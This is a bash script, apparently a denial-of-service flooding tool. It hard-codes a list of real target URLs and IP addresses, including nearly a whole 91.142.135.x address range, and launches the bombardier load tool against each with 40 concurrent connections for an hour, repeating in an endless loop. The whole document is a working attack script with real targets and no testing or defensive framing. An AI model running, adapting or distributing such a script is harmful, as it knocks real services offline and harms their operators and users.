#!/bin/bash -x

DESTS=("https://v2.premise.com/"
"http://195.93.247.48:80/"
"https://195.93.247.144:443/"
"http://195.140.146.69:80/"
"http://195.93.247.53:80/"
"http://84.201.176.124:22/"
"http://178.154.224.115:22/"
"http://195.42.165.36:80/"
"http://195.42.165.36:443/"
"https://34.149.163.214/"
"https://premise.com/" 
"http://91.149.180.89:443/"
"91.142.135.0"
"91.142.135.1"
"91.142.135.2"
"91.142.135.3"
"91.142.135.4"
"91.142.135.5"
"91.142.135.6"
"91.142.135.7"
"91.142.135.8"
"91.142.135.9"
"91.142.135.10"
"91.142.135.11"
"91.142.135.12"
"91.142.135.13"
"91.142.135.14"
"91.142.135.15"
"91.142.135.16"
"91.142.135.17"
"91.142.135.18"
"91.142.135.19"
"91.142.135.20"
"91.142.135.21"
"91.142.135.22"
"91.142.135.23"
"91.142.135.24"
"91.142.135.25"
"91.142.135.26"
"91.142.135.27"
"91.142.135.28"
"91.142.135.29"
"91.142.135.30"
"91.142.135.31"
"91.142.135.32"
"91.142.135.33"
"91.142.135.34"
"91.142.135.35"
"91.142.135.36"
"91.142.135.37"
"91.142.135.38"
"91.142.135.39"
"91.142.135.40"
"91.142.135.41"
"91.142.135.42"
"91.142.135.43"
"91.142.135.44"
"91.142.135.45"
"91.142.135.46"
"91.142.135.47"
"91.142.135.48"
"91.142.135.49"
"91.142.135.50"
"91.142.135.51"
"91.142.135.52"
"91.142.135.53"
"91.142.135.54"
"91.142.135.55"
"91.142.135.56"
"91.142.135.57"
"91.142.135.58"
"91.142.135.59"
"91.142.135.60"
"91.142.135.61"
"91.142.135.62"
"91.142.135.63"
"91.142.135.64"
"91.142.135.65"
"91.142.135.66"
"91.142.135.67"
"91.142.135.68"
"91.142.135.69"
"91.142.135.70"
"91.142.135.71"
"91.142.135.72"
"91.142.135.73"
"91.142.135.74"
"91.142.135.75"
"91.142.135.76"
"91.142.135.77"
"91.142.135.78"
"91.142.135.79"
"91.142.135.80"
"91.142.135.81"
"91.142.135.82"
"91.142.135.83"
"91.142.135.84"
"91.142.135.85"
"91.142.135.86"
"91.142.135.87"
"91.142.135.88"
"91.142.135.89"
"91.142.135.90"
"91.142.135.91"
"91.142.135.92"
"91.142.135.93"
"91.142.135.94"
"91.142.135.95"
"91.142.135.96"
"91.142.135.97"
"91.142.135.98"
"91.142.135.99"
"91.142.135.100"
"91.142.135.101"
"91.142.135.102"
"91.142.135.103"
"91.142.135.104"
"91.142.135.105"
"91.142.135.106"
"91.142.135.107"
"91.142.135.108"
"91.142.135.109"
"91.142.135.110"
"91.142.135.111"
"91.142.135.112"
"91.142.135.113"
"91.142.135.114"
"91.142.135.115"
"91.142.135.116"
"91.142.135.117"
"91.142.135.118"
"91.142.135.119"
"91.142.135.120"
"91.142.135.121"
"91.142.135.122"
"91.142.135.123"
"91.142.135.124"
"91.142.135.125"
"91.142.135.126"
"91.142.135.127"
"91.142.135.128"
"91.142.135.129"
"91.142.135.130"
"91.142.135.131"
"91.142.135.132"
"91.142.135.133"
"91.142.135.134"
"91.142.135.135"
"91.142.135.136"
"91.142.135.137"
"91.142.135.138"
"91.142.135.139"
"91.142.135.140"
"91.142.135.141"
"91.142.135.142"
"91.142.135.143"
"91.142.135.144"
"91.142.135.145"
"91.142.135.146"
"91.142.135.147"
"91.142.135.148"
"91.142.135.149"
"91.142.135.150"
"91.142.135.151"
"91.142.135.153"
"91.142.135.154"
"91.142.135.155"
"91.142.135.156"
"91.142.135.157"
"91.142.135.158"
"91.142.135.159"
"91.142.135.160"
"91.142.135.161"
"91.142.135.162"
"91.142.135.163"
"91.142.135.164"
"91.142.135.165"
"91.142.135.166"
"91.142.135.167"
"91.142.135.168"
"91.142.135.169"
"91.142.135.170"
"91.142.135.171"
"91.142.135.172"
"91.142.135.173"
"91.142.135.174"
"91.142.135.175"
"91.142.135.176"
"91.142.135.177"
"91.142.135.178"
"91.142.135.179"
"91.142.135.180"
"91.142.135.181"
"91.142.135.182"
"91.142.135.183"
"91.142.135.184"
"91.142.135.185"
"91.142.135.186"
"91.142.135.187"
"91.142.135.188"
"91.142.135.189"
"91.142.135.190"
"91.142.135.191"
"91.142.135.192"
"91.142.135.193"
"91.142.135.194"
"91.142.135.195"
"91.142.135.196"
"91.142.135.197"
"91.142.135.198"
"91.142.135.199"
"91.142.135.200"
"91.142.135.201"
"91.142.135.202"
"91.142.135.203"
"91.142.135.204"
"91.142.135.205"
"91.142.135.206"
"91.142.135.207"
"91.142.135.208"
"91.142.135.209"
"91.142.135.210"
"91.142.135.211"
"91.142.135.212"
"91.142.135.213"
"91.142.135.214"
"91.142.135.215"
"91.142.135.216"
"91.142.135.217"
"91.142.135.218"
"91.142.135.219"
"91.142.135.220"
"91.142.135.221"
"91.142.135.222"
"91.142.135.223"
"91.142.135.224"
"91.142.135.225"
"91.142.135.226"
"91.142.135.227"
"91.142.135.228"
"91.142.135.229"
"91.142.135.230"
"91.142.135.231"
"91.142.135.232"
"91.142.135.233"
"91.142.135.234"
"91.142.135.235"
"91.142.135.236"
"91.142.135.237"
"91.142.135.238"
"91.142.135.239"
"91.142.135.240"
"91.142.135.241"
"91.142.135.242"
"91.142.135.243"
"91.142.135.244"
"91.142.135.245"
"91.142.135.246"
"91.142.135.247"
"91.142.135.248"
"91.142.135.249"
"91.142.135.250"
"91.142.135.251"
"91.142.135.252"
"91.142.135.253"
"91.142.135.254"
"193.30.239.36"
"193.30.239.35"
"193.30.239.32"
"193.30.239.31"
"195.128.158.115"
"193.30.239.34"
"217.22.170.68"
"193.30.239.33"
"193.43.182.3"
"194.186.236.187"
"217.22.170.180"
"46.61.139.227")
TIME="60m"
CONNECTIONSPERTARGET=40

while true
do
    for DEST in ${DESTS[@]}
    do
        bombardier -c $CONNECTIONSPERTARGET -d $TIME -l $DEST &
    done
	sleep 3550s
done
